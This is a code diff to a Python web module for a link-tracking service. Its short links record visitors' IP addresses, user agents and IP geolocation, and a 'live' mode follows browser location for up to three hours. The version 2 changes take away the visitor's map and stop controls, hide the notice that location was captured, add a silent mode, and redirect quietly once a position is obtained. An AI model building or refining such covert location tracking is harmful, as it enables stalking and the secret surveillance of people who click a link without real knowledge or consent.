@@ -6,6 +6,12 @@ main.py の snsx と同じ場所で include する:
 
 /l/ 配下はこのモジュールが担当する（main.py の同名ルートより先に登録されるため）。
 認証・render・ヒット記録は main.py 側を遅延参照して使い回すので挙動がズレない。
+
+v2:
+  ・来訪者側の「マップ／開始／停止」を廃止（ui は 自動 / 無言 / 案内のみ）
+  ・取得できなかったときに出るボタンは「もう一度」だけ
+  ・一度でも測位できたら未取得判定に戻らない
+  ・「取得しました」を来訪者に見せない（取得後は静かに遷移）
 """
 from __future__ import annotations
 
@@ -29,12 +35,9 @@ LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))
 LIVE_DEFAULTS = {
     "ui": "",
     "ask_text": "位置情報の使用を許可してください",
-    "wait_text": "位置情報を取得しています…",
-    "ok_text": "取得しました。移動します…",
     "deny_text": "位置情報が許可されていません。許可すると先へ進めます",
     "retry_text": "もう一度",
     "go_text": "続ける",
-    "skip_text": "このまま進む",
     "wait_sec": 15.0,
     "dest_min": 2.0,
     "deny_redirect": False,
@@ -43,21 +46,24 @@ LIVE_DEFAULTS = {
 }
 
 ENV_MAP = {
-    "ui": "LIVE_UI", "ask_text": "LIVE_ASK_TEXT", "wait_text": "LIVE_WAIT_TEXT",
-    "ok_text": "LIVE_OK_TEXT", "deny_text": "LIVE_DENY_TEXT",
-    "retry_text": "LIVE_RETRY_TEXT", "go_text": "LIVE_GO_TEXT",
-    "skip_text": "LIVE_SKIP_TEXT",
-    "wait_sec": "LIVE_WAIT", "dest_min": "LIVE_DEST_MIN",
-    "deny_redirect": "LIVE_DENY_REDIRECT", "dest_redirect": "LIVE_DEST_REDIRECT",
+    "ui": "LIVE_UI",
+    "ask_text": "LIVE_ASK_TEXT",
+    "deny_text": "LIVE_DENY_TEXT",
+    "retry_text": "LIVE_RETRY_TEXT",
+    "go_text": "LIVE_GO_TEXT",
+    "wait_sec": "LIVE_WAIT",
+    "dest_min": "LIVE_DEST_MIN",
+    "deny_redirect": "LIVE_DENY_REDIRECT",
+    "dest_redirect": "LIVE_DEST_REDIRECT",
     "promote_page": "PROMOTE_PAGE_TO_LIVE",
 }
 
-UI_CHOICES = ("", "none", "ask", "map", "full")
-UI_LABEL = {"": "自動（飛び先があれば「許可を求める」／なければ無言）",
-            "none": "完全に無言（何も表示しない）",
-            "ask": "許可を求める1行だけ",
-            "map": "地図だけ",
-            "full": "全部（状態・地図・ボタン）"}
+UI_CHOICES = ("", "none", "ask")
+UI_LABEL = {
+    "": "自動（飛び先があれば案内を出す／なければ無言）",
+    "none": "無言（文言なし。失敗時だけ「もう一度」ボタン）",
+    "ask": "案内の1行だけ出す",
+}
 
 
 def _coerce(key, v):
@@ -92,6 +98,7 @@ def live_cfg():
             if v is None or v == "":
                 continue
             out[k] = _coerce(k, v)
+    # 旧設定の map / full はここで自動に寄せる
     if out["ui"] not in UI_CHOICES:
         out["ui"] = ""
     out["wait_sec"] = max(3.0, min(float(out["wait_sec"]), 120.0))
@@ -236,9 +243,8 @@ def _live_page(request, code, hid, link, nonce):
     return render("link_live.html", request, code=code, hit_id=hid, link=link,
                   dest=dest, nonce=nonce,
                   iv=_clamp_iv(link["interval"]), maxmin=LIVE_MAX_MIN,
-                  ui=ui, ask_text=L["ask_text"], ok_text=L["ok_text"],
-                  deny_text=L["deny_text"], retry_text=L["retry_text"],
-                  skip_text=L["skip_text"], wait_sec=L["wait_sec"],
+                  ui=ui, ask_text=L["ask_text"], deny_text=L["deny_text"],
+                  retry_text=L["retry_text"], wait_sec=L["wait_sec"],
                   dest_redirect=(L["dest_redirect"] and bool(dest)),
                   deny_redirect=(L["deny_redirect"] and bool(dest)),
                   dest_min=L["dest_min"])
@@ -267,12 +273,14 @@ def link_hit(code: str, request: Request):
                "options": json.loads(r["options"] or "[]")} for r in db.questions(code)]
         return render("link_quiz.html", request, code=code, hit_id=hid, link=link,
                       dest=link["dest"] or "", nonce=nonce,
+                      retry_text=L["retry_text"],
                       questions_json=json.dumps(qs, ensure_ascii=False))
 
     if mode == "identify":
         ip = linktrack.client_ip(request)
         return render("link_identify.html", request, code=code, hit_id=hid, link=link,
                       dest=link["dest"] or "", nonce=nonce, ip=ip,
+                      retry_text=L["retry_text"],
                       p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                       g=linktrack.geo(ip))
 
@@ -286,9 +294,8 @@ def link_hit(code: str, request: Request):
     # 一瞬 / geo 用ランディング
     return render("link_land.html", request, code=code, hit_id=hid, link=link,
                   dest=link["dest"] or "", nonce=nonce,
-                  go_text=L["go_text"], wait_text=L["wait_text"], ok_text=L["ok_text"],
+                  ask_text=L["ask_text"], go_text=L["go_text"],
                   deny_text=L["deny_text"], retry_text=L["retry_text"],
-                  skip_text=L["skip_text"],
                   deny_redirect=L["deny_redirect"], dest_min=L["dest_min"])
 
 
@@ -497,12 +504,9 @@ async def live_settings_save(request: Request, u=Depends(auth)):
     data = {
         "ui": s("ui"),
         "ask_text": s("ask_text")[:120],
-        "wait_text": s("wait_text")[:120],
-        "ok_text": s("ok_text")[:120],
         "deny_text": s("deny_text")[:200],
         "retry_text": s("retry_text")[:40],
         "go_text": s("go_text")[:40],
-        "skip_text": s("skip_text")[:40],
         "wait_sec": max(3.0, min(num("wait_sec", 15), 120.0)),
         "dest_min": max(0.5, min(num("dest_min", 2), 30.0)),
         "deny_redirect": flag("deny_redirect"),
